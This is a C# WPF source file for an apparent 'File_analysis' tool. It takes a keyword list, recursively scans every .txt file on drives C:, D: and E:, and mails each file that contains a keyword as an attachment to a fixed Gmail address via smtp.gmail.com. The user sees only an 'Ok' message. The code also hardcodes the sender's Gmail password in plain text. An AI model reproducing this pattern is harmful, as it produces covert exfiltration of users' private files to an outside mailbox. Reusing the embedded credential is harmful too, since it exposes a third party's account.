using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace File_analysis
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        static public List<string> words=new List<string>();
        static public List<string> files=new List<string>();
        static public List<string> filesOk=new List<string>();
        static Mutex mutex = new Mutex();
        public MainWindow()
        {
            InitializeComponent();
            
        }

        private void AddFileBtn_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog open = new OpenFileDialog();
            FileStream fStream;
            string text;
            open.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            open.Filter = "All Files(*.*)|*.*|Text Files(*.txt)|*.txt||";
            open.FilterIndex = 2;
            if (open.ShowDialog() == true)
            {
                fStream = new FileStream(open.FileName, FileMode.OpenOrCreate);
                using (StreamReader reader = new StreamReader(fStream)) {
                    text = reader.ReadToEnd();
                }
                fStream.Close();
                 words = text.Split(new char[] { ' ', ',', '.', '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries).ToList();
                foreach (var word in words)
                {
                    ListWords.Items.Add(word);

                }
            }
            
        }

        private void AddWordBtn_Click(object sender, RoutedEventArgs e)
        {
            if(WordTB.Text != string.Empty)
            {
                words.Add(WordTB.Text);
                ListWords.Items.Add(WordTB.Text);
                WordTB.Text = "";
            }
        }
        static private void EmailSMS(string path)
        {
            MailAddress from= new MailAddress("darina.kruk.02@gmail.com","я");
            MailAddress to = new MailAddress("darina.kruk.02@gmail.com");
            MailMessage message = new MailMessage(from,to);
            message.Subject = "Sikret file";
            message.Attachments.Add(new Attachment(path));
            SmtpClient smtp = new SmtpClient("smtp.gmail.com",587);
            smtp.Credentials = new NetworkCredential("darina.kruk.02@gmail.com", "051102@dK");
            smtp.EnableSsl = true;
            try
            {
                smtp.Send(message);
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
        }
        static void ReadFile(object obj)
        {
            mutex.WaitOne();
            string item=obj as string;
            string fieText;
            using (StreamReader reader = new StreamReader(item))
            {
                fieText = reader.ReadToEnd();
            }
            var wordsFie = fieText.Split(new char[] { ' ', ',', '.', '\n', '\r', '\t', '(', ')', ';', ':' }, StringSplitOptions.RemoveEmptyEntries).ToList();
            foreach (var word in words)
            {
                foreach (var wf in wordsFie)
                {
                    if (word == wf)
                    {
                        EmailSMS(item);
                        filesOk.Add(item); break;
                    }
                }
            }
            mutex.ReleaseMutex();

        }
        private void StartBtn_Click(object sender, RoutedEventArgs e)
        {
            string pathC = @"C:\";
            ReadFiles(pathC);

            foreach (var item in files)
            {
                ParameterizedThreadStart rf = new ParameterizedThreadStart(ReadFile);
                Thread thread = new Thread(rf);
                thread.Start(item);
            }
            files.Clear();
            string pathD = @"D:\";
            ReadFiles(pathD);

            foreach (var item in files)
            {
                ParameterizedThreadStart rf = new ParameterizedThreadStart(ReadFile);
                Thread thread = new Thread(rf);
                thread.Start(item);
            }
            files.Clear();
            string pathE = @"E:\";
            ReadFiles(pathE);

            foreach (var item in files)
            {
                ParameterizedThreadStart rf = new ParameterizedThreadStart(ReadFile);
                Thread thread = new Thread(rf);
                thread.Start(item);
            }
            MessageBox.Show($"Ok");

        }
        static void ReadFiles(string path)
        {
            foreach (var item in GetFiles(path))
            {
                FileStream fs = new FileStream(item, FileMode.Open, FileAccess.Read);
                using (StreamReader reader = new StreamReader(fs))
                {
                    files.Add(fs.Name);
                }
            }
        }

        static List<string> GetFiles(string path)
        {
            List<string> files = new List<string>();


            try
            {
                string[] entries = Directory.GetFiles(path, "*.txt");

                foreach (string entry in entries)
                    files.Add(System.IO.Path.Combine(path, entry));
            }
            catch
            {

            }

            // follow the subdirectories
            try
            {
                string[] entries = Directory.GetDirectories(path);

                foreach (string entry in entries)
                {
                    string current_path = System.IO.Path.Combine(path, entry);
                    List<string> files_in_subdir = GetFiles(current_path);

                    foreach (string current_file in files_in_subdir)
                        files.Add(current_file);
                }
            }
            catch
            {
                // an exception in directory.getdirectories is not recoverable: the directory is not accessible
            }

            return files;
        }
    }
}
